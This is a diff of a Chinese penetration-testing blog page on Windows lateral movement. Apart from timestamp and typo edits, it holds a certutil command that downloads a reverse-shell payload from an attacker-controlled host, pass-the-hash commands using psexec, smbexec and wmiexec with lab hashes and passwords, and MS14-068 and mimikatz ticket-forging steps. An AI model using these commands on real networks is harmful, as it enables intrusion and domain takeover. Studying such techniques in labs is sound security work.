@@ -121,7 +121,7 @@
 <meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/0e27d474e4b3cd57f169ec3d45168bf7b0c3be25.png@753w_132h_progressive.webp">
 <meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/641c898428e69f32b54c85e1422075b383421816.png@831w_243h_progressive.webp">
 <meta property="article:published_time" content="2023-04-14T13:31:48.000Z">
-<meta property="article:modified_time" content="2023-04-14T13:33:12.166Z">
+<meta property="article:modified_time" content="2023-05-04T14:47:55.032Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228154128442.png">
@@ -347,8 +347,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-04-14 21:33:12</span>
-            <span class="mobile">2023-04-14 21:33</span>
+            <span class="desktop">2023-05-04 22:47:55</span>
+            <span class="mobile">2023-05-04 22:47</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -549,7 +549,7 @@
 
 <p>对于Windows，已经获得管理员权限的可以直接手动配置一个SMB服务器</p>
 <p>也可以通过Invoke-BuildAnonymousSMBServer在本地快速启动一个匿名共享。</p>
-<h4 id="通过Windows自带的工具"><a href="#通过Windows自带的工具" class="headerlink" title="通过Windows自带的工具"></a>通过Windows自带的工具</h4><h6 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h6><p>Certutil是一个Windows自带的命令行工具，用于管理证书安装，提供了从网络下载文件的功能，可以先在服务器上部署攻击载荷然后下载下来</p>
+<h4 id="通过Windows自带的工具"><a href="#通过Windows自带的工具" class="headerlink" title="通过Windows自带的工具"></a>通过Windows自带的工具</h4><h6 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h6><p>是一个Windows自带的命令行工具，用于管理证书安装，提供了从网络下载文件的功能，可以先在服务器上部署攻击载荷然后下载下来</p>
 <p>执行</p>
 <p><code>certutil -urlcache -split -f http://你的IP:端口port/shell.exe C:\reverse_tcp.exe</code></p>
 <p>通过Certutil下载shell.exe，并保存在C:\reverse_tcp.exe</p>
@@ -778,7 +778,7 @@
 
 
 <p>如果没有明文密码，只有hash密码的话官方的pstools不能使用，这时候就需要使用impacket中别人二改的psexec.exe</p>
-<p>psexec.exe -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;<a class="link"   href="mailto:&#97;&#100;&#x6d;&#x69;&#x6e;&#105;&#115;&#x74;&#114;&#97;&#116;&#111;&#114;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#51;&#x2e;&#51;&#x32;" >&#97;&#100;&#x6d;&#x69;&#x6e;&#105;&#115;&#x74;&#114;&#97;&#116;&#111;&#114;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#51;&#x2e;&#51;&#x32; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
+<p>psexec.exe -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;<a class="link"   href="mailto:&#x61;&#x64;&#109;&#x69;&#x6e;&#105;&#115;&#x74;&#114;&#97;&#116;&#111;&#x72;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#x33;&#46;&#51;&#50;" >&#x61;&#x64;&#109;&#x69;&#x6e;&#105;&#115;&#x74;&#114;&#97;&#116;&#111;&#x72;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#x33;&#46;&#51;&#50; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
 <h6 id="smbexec（无需先ipc连接-明文传递）"><a href="#smbexec（无需先ipc连接-明文传递）" class="headerlink" title="smbexec（无需先ipc连接 明文传递）"></a>smbexec（无需先ipc连接 明文传递）</h6><p>连接sqlserver的非域内主机</p>
 <p>smbexec .&#x2F;administrator:admin!@#45  @192.168.3.32 </p>
 <p>链接sqlserver的域内用户</p>
@@ -786,7 +786,7 @@
 <p>建立哈希连接（sqlserver的非域管理员）：</p>
 <p>smbexec -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;administrator  @192.168.3.32 </p>
 <p>通过域用户中域管理员登陆sqlserver服务器（域管理员可以登陆域内任意主机）</p>
-<p>smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god&#x2F;<a class="link"   href="mailto:&#x61;&#100;&#109;&#x69;&#110;&#105;&#x73;&#x74;&#x72;&#97;&#116;&#x6f;&#114;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#51;&#x2e;&#51;&#x32;" >&#x61;&#100;&#109;&#x69;&#110;&#105;&#x73;&#x74;&#x72;&#97;&#116;&#x6f;&#114;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#51;&#x2e;&#51;&#x32; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god&#x2F;<a class="link"   href="mailto:&#97;&#x64;&#109;&#x69;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#x6f;&#x72;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#51;&#x2e;&#x33;&#x32;" >&#97;&#x64;&#109;&#x69;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#x6f;&#x72;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#51;&#x2e;&#x33;&#x32; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <h6 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h6><p>使用命令</p>
 <p><code>wmiexec HACK-MY/Administrator:Admin!@#45@192.168.30.10</code>连接域内主机，就可以远程命令控制</p>
 <p><img  
@@ -814,8 +814,8 @@
 <p>明文连接域控：</p>
 <p>wmiexec god&#x2F;administrator:Admin12345    @192.168.3.21 “whoami”</p>
 <p>哈希分别连接sqlserver和域控</p>
-<p>wmiexec -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;<a class="link"   href="mailto:&#97;&#100;&#109;&#105;&#110;&#x69;&#x73;&#116;&#x72;&#x61;&#116;&#111;&#114;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#56;&#46;&#x33;&#46;&#x33;&#50;" >&#97;&#100;&#109;&#105;&#110;&#x69;&#x73;&#116;&#x72;&#x61;&#116;&#111;&#114;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#56;&#46;&#x33;&#46;&#x33;&#50; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> “whoami”</p>
-<p>wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god&#x2F;<a class="link"   href="mailto:&#97;&#x64;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#x74;&#111;&#114;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#51;&#x2e;&#x32;&#49;" >&#97;&#x64;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#x74;&#111;&#114;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#51;&#x2e;&#x32;&#49; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> “whoami”</p>
+<p>wmiexec -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;<a class="link"   href="mailto:&#97;&#100;&#109;&#x69;&#x6e;&#x69;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#51;&#46;&#51;&#50;" >&#97;&#100;&#109;&#x69;&#x6e;&#x69;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#51;&#46;&#51;&#50; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> “whoami”</p>
+<p>wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god&#x2F;<a class="link"   href="mailto:&#x61;&#x64;&#109;&#x69;&#x6e;&#105;&#115;&#x74;&#114;&#97;&#x74;&#x6f;&#114;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#54;&#56;&#46;&#51;&#x2e;&#x32;&#49;" >&#x61;&#x64;&#109;&#x69;&#x6e;&#105;&#115;&#x74;&#114;&#97;&#x74;&#x6f;&#114;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#54;&#56;&#46;&#51;&#x2e;&#x32;&#49; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> “whoami”</p>
 <h6 id="WMI订阅事件"><a href="#WMI订阅事件" class="headerlink" title="WMI订阅事件"></a>WMI订阅事件</h6><p>相当于一个条件触发事件，其中条件被称为“事件过滤器”，做出的响应称为“事件消费者”</p>
 <p>部署事件订阅的时候，需要分别构建Filter以及Consumer，且绑定一起</p>
 <p>手动利用</p>
@@ -1025,7 +1025,7 @@
                      data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302160204415.png"
                       alt="image-20230302160204415"
                 ></p>
-<h5 id="PTT传递-MS140-68-amp-kekoo-amp"><a href="#PTT传递-MS140-68-amp-kekoo-amp" class="headerlink" title="PTT传递-MS140-68&amp;kekoo&amp;"></a>PTT传递-MS140-68&amp;kekoo&amp;</h5><h6 id="MS14068：可以实现普通用户直接后去域控system权限"><a href="#MS14068：可以实现普通用户直接后去域控system权限" class="headerlink" title="MS14068：可以实现普通用户直接后去域控system权限"></a>MS14068：可以实现普通用户直接后去域控system权限</h6><p>执行过程：</p>
+<h5 id="PTT传递-MS14-068-amp-kekoo-amp"><a href="#PTT传递-MS14-068-amp-kekoo-amp" class="headerlink" title="PTT传递-MS14-068&amp;kekoo&amp;"></a>PTT传递-MS14-068&amp;kekoo&amp;</h5><h6 id="MS14068：可以实现普通用户直接获取域控system权限"><a href="#MS14068：可以实现普通用户直接获取域控system权限" class="headerlink" title="MS14068：可以实现普通用户直接获取域控system权限"></a>MS14068：可以实现普通用户直接获取域控system权限</h6><p>执行过程：</p>
 <ol>
 <li>查看当前sid      whoami&#x2F;user</li>
 <li>mimikatz          kerberos::purge（清空当前主机中所有凭证，如果有域成员凭证会影响凭证伪造）</li>
@@ -1033,13 +1033,13 @@
 <p>​       mimikatz          kerberos::list         查看当前主机的凭证</p>
 <p>​       mimikatz          kerberos::ptc         将票据注入到内存中</p>
 <ol start="3">
-<li><p>利用ms14268生成TGT数据</p>
+<li><p>利用ms14068生成TGT数据</p>
 <pre><code>ms14-068.exe -u 域成员名@域名 -s 当前域用户的sid -d 域控制器地址 -p 域成员密码
 </code></pre>
 </li>
 </ol>
-<p>.\MS14-068.exe -u <a class="link"   href="mailto:&#x6d;&#97;&#x72;&#121;&#64;&#103;&#x6f;&#x64;&#46;&#x6f;&#x72;&#103;" >&#x6d;&#97;&#x72;&#121;&#64;&#103;&#x6f;&#x64;&#46;&#x6f;&#x72;&#103; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45（注意前面要加.\）</p>
-<p>这里发现自动创建了个<a class="link"   href="mailto:&#x54;&#x47;&#x54;&#x5f;&#x6d;&#x61;&#114;&#x79;&#x40;&#x67;&#111;&#x64;&#x2e;&#x6f;&#x72;&#103;&#x2e;&#99;&#99;&#97;&#x63;&#104;&#101;" >&#x54;&#x47;&#x54;&#x5f;&#x6d;&#x61;&#114;&#x79;&#x40;&#x67;&#111;&#x64;&#x2e;&#x6f;&#x72;&#103;&#x2e;&#99;&#99;&#97;&#x63;&#104;&#101; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>文件</p>
+<p>.\MS14-068.exe -u <a class="link"   href="mailto:&#x6d;&#97;&#x72;&#121;&#64;&#x67;&#x6f;&#100;&#46;&#x6f;&#x72;&#x67;" >&#x6d;&#97;&#x72;&#121;&#64;&#x67;&#x6f;&#100;&#46;&#x6f;&#x72;&#x67; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45（注意前面要加.\）</p>
+<p>这里发现自动创建了个<a class="link"   href="mailto:&#84;&#71;&#x54;&#95;&#x6d;&#x61;&#114;&#x79;&#64;&#x67;&#111;&#100;&#46;&#x6f;&#x72;&#x67;&#x2e;&#x63;&#99;&#97;&#99;&#104;&#101;" >&#84;&#71;&#x54;&#95;&#x6d;&#x61;&#114;&#x79;&#64;&#x67;&#111;&#100;&#46;&#x6f;&#x72;&#x67;&#x2e;&#x63;&#99;&#97;&#99;&#104;&#101; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>文件</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -1055,7 +1055,7 @@
 <ol start="4">
 <li>票据注入内存</li>
 </ol>
-<p>​       mimikatz.exe “kerberos::ptc <a class="link"   href="mailto:&#x54;&#71;&#x54;&#x5f;&#x6d;&#x61;&#x72;&#121;&#64;&#x67;&#111;&#x64;&#x2e;&#111;&#x72;&#103;&#x2e;&#x63;&#99;&#x61;&#x63;&#x68;&#x65;" >&#x54;&#71;&#x54;&#x5f;&#x6d;&#x61;&#x72;&#121;&#64;&#x67;&#111;&#x64;&#x2e;&#111;&#x72;&#103;&#x2e;&#x63;&#99;&#x61;&#x63;&#x68;&#x65; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“ exit</p>
+<p>​       mimikatz.exe “kerberos::ptc <a class="link"   href="mailto:&#84;&#71;&#x54;&#x5f;&#109;&#x61;&#114;&#x79;&#x40;&#x67;&#111;&#100;&#x2e;&#111;&#114;&#103;&#x2e;&#x63;&#x63;&#x61;&#99;&#104;&#x65;" >&#84;&#71;&#x54;&#x5f;&#109;&#x61;&#114;&#x79;&#x40;&#x67;&#111;&#100;&#x2e;&#111;&#114;&#103;&#x2e;&#x63;&#x63;&#x61;&#99;&#104;&#x65; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“ exit</p>
 <ol start="5">
 <li>然后就可以直接连接了    dir \主机名\c$</li>
 </ol>
@@ -1481,7 +1481,7 @@
         <li><strong>Created at:</strong> 2023-04-14 21:31:48</li>
         
             <li>
-                <strong>Updated at:</strong> 2023-04-14 21:33:12
+                <strong>Updated at:</strong> 2023-05-04 22:47:55
             </li>
         
         <li>
